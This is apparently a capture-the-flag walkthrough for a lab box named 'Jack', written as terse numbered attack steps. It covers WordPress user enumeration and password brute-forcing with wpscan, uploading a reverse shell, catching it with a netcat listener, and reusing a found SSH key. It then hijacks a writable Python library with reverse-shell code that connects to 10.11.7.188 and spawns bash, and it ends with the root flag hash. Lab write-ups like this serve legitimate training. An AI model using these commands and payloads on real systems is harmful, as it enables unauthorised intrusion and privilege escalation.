# Jack

1. sudo nmap -sC -sV -oN nmap/$(basename $PWD) $IP
2. wpscan -e u,ap --url http://jack.thm
   - Users: wendy danny jack
3.  wpscan -U users.txt -P /opt/fasttrack.txt --url jack.thm
   -  Username: wendy, Password: changelater
4. Burpsuite get admin
5. Upload rev shell
6. nc -nvlp 4444

7. 

```
# In reverse shell
$ /usr/bin/python3.5 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

# In Attacker console
stty -a
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>  
```

  - python -c 'import pty; pty.spawn("/bin/bash")'
8.  find / -type d -name backup* 2>/dev/null
    ssh -i /var/backups/id_rsa jack@127.1
9. Use `pspy ` find /opt/statuscheck/checker.py
10. id
    find / -group family -ls 2>/dev/null
11. ls -la /usr/lib/python2.7/os.py

```
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.11.7.188",9999))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

cat root.txt
b8b63a861cc09e853f29d8055d64bffb
